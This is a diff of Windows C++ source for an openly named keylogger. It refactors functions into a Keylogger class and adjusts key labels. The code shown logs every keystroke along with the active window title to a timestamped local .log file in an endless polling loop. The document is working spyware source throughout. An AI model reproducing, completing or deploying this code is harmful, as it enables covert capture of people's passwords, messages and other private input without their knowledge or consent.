@@ -1,6 +1,6 @@
 #include "stdafx.h"
+#include "Keylogger.h"
 
-#include <string>
 #include <windows.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -8,15 +8,12 @@
 #include <iostream>
 #include <fstream>
 
-std::string intToString(int);
-std::string getSelfPath();
-std::string dirBasename(std::string);
 
 #define FILEEXT ".log"
 #define DEBUG
 #define DEBUG_TO_LOGS
 
-std::string intToString(int i)
+std::string Keylogger::intToString(int i)
 {
 	//#ifdef DEBUG
 	printf("Converting: %d to string.\n", i);
@@ -26,10 +23,10 @@ std::string intToString(int i)
 	return std::string(buffer);
 }
 
-std::string getSelfPath()
+std::string Keylogger::getSelfPath()
 {
 #ifdef DEBUG
-	printf("getSelfPath() ");
+	//printf("getSelfPath() ");
 #endif
 	char selfpath[MAX_PATH];
 	wchar_t selfpath_wchar[MAX_PATH];
@@ -41,10 +38,10 @@ std::string getSelfPath()
 	return std::string(selfpath);
 }
 
-std::string dirBasename(std::string path)
+std::string Keylogger::dirBasename(std::string path)
 {
 #ifdef DEBUG
-	printf("dirBasename() ");
+	//printf("dirBasename() ");
 #endif
 	if (path.empty())
 		return std::string("");
@@ -66,7 +63,7 @@ std::string dirBasename(std::string path)
 }
 
 
-bool update_window(const std::string &last_title, const std::string &current_title, std::ofstream &file_logs)
+bool Keylogger::update_window(const std::string &last_title, const std::string &current_title, std::ofstream &file_logs)
 {
 	if (last_title != current_title)
 	{
@@ -99,7 +96,7 @@ bool update_window(const std::string &last_title, const std::string &current_tit
 	return false;
 }
 
-std::string get_window_name()
+std::string Keylogger::get_window_name()
 {
 #ifdef DEBUG_TO_LOGS
 	//printf("Geting title of the window.\n");
@@ -122,7 +119,7 @@ std::string get_window_name()
 }
 
 
-void get_key(std::ofstream &file_logs)
+void Keylogger::get_key(std::ofstream &file_logs)
 {
 	// logging keys, thats the keylogger
 
@@ -155,9 +152,9 @@ void get_key(std::ofstream &file_logs)
 			else if (c == 163) // lastc == 17
 				key = "[RIGHT CTRL]";
 			else if (c == 164) // lastc == 18
-				key = "[ALT]";
+				key = "[LEFT ALT]";
 			else if (c == 165)
-				key = "[ALT GR]";
+				key = "[RIGHT ALT]";
 			else if (c == 8)
 				key = "[BACKSPACE]";
 			else if (c == 9)
@@ -247,9 +244,7 @@ void get_key(std::ofstream &file_logs)
 		}
 	}
 }
-
-
-int main(int argc, char *argv[])
+std::ofstream Keylogger::create_file()
 {
 	time_t rawtime;
 	struct tm timeinfo;
@@ -266,23 +261,28 @@ int main(int argc, char *argv[])
 	printf("Saving content to: filepath '%s'\n", file_path);
 #endif // DEBUG
 
+	return std::ofstream(file_path);
+}
+
+
+int main(int argc, char *argv[])
+{
+	Keylogger keylogger;
+	std::ofstream file_logs = keylogger.create_file();
 
 	std::string last_title = "";
-	std::ofstream file_logs(file_path);
-
-	//SHORT lastc = 0;
 	while (1)
 	{
 		Sleep(10); // give other programs time to run
 
-		std::string current_title = get_window_name();
-		bool title_changed = update_window(last_title, current_title, file_logs);
+		std::string current_title = keylogger.get_window_name();
+		bool title_changed = keylogger.update_window(last_title, current_title, file_logs);
 		if (title_changed)
 		{
 			last_title = current_title;
 		}
 
-		get_key(file_logs);
+		keylogger.get_key(file_logs);
 	}
 
 	file_logs.close();
